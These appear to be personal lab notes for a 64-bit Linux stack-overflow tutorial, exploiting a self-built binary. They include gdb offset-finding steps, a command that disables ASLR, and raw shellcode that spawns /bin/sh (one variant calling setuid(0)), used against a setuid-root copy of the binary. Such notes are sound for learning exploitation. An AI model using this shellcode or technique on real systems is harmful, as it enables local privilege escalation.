part 1
https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/

https://github.com/longld/peda
https://gist.github.com/superkojiman/6a6e44db390d6dfc329a


https://stackoverflow.com/questions/23367624/intel-64-rsi-and-rdi-registers
https://stackoverflow.com/questions/4429398/why-does-windows64-use-a-different-calling-convention-from-all-other-oses-on-x86/35619528#35619528

# setuid needed for ubuntu 16 (part 2 comments)


make
python in.py > in.txt


gdb classic.debug
break 13
r < normal.txt

# A is 0x41

gdb classic
r < in.txt  # 400 A's
pattern_create 400 in.txt  # pattern to help find position of return address in AR
r < in.txt
x/wx $rsp

# notice return pointer is different every run?
# shut off aslr
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# be sure to turn it back on!
# now it's the same, no more randomization (loader level)

gdb classic
r < in.txt  # 400 A's
pattern_create 400 in.txt  # pattern to help find position of return address in AR
r < in.txt
x/wx $rsp
# pattern_offset 0x######## # from previous command, e.g.,
pattern_offset 0x41413741
# found at offset 104 in my case
# updated find_ip.py with 104
python find_ip.py > in.txt
gdb classic
r < in.txt
x/wx $rip
# now it's our payload, 0x42424242


# shell code
# calls execve (syscall 59 or 0x3b in linux x86_64)

# store shell code in env var
# http://shell-storm.org/shellcode/files/shellcode-806.php
# export PWN=`python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`  # no setuid, only for progs that call setuid
# http://shell-storm.org/shellcode/files/shellcode-77.php
export PWN=`python -c 'print "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"'`  # shell calls setuid(0) first

# find address of env var when running the program
./getenvaddr PWN ./classic
# PWN will be at 0x7fffffffe318
# edit exploit.py to put overwrite %rip with the address of the shellcode
python exploit.py > in.txt

sudo chown root classic
sudo chmod 4755 classic

(cat in.txt ; cat) | ./classic
